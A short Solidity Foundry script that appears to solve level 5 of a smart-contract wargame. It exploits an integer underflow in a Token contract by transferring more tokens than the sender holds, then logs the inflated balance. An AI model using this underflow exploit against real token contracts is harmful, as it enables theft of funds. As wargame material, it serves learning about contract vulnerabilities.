// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Token} from "../src/level5Token.sol";

contract level5Solution is Script {
    Token token = Token(0x0b0372B48BBE7d46b5e16233Ea2D615e2C1CAb0B);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(0x0b0372B48BBE7d46b5e16233Ea2D615e2C1CAb0B, 20);
        console.log(token.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
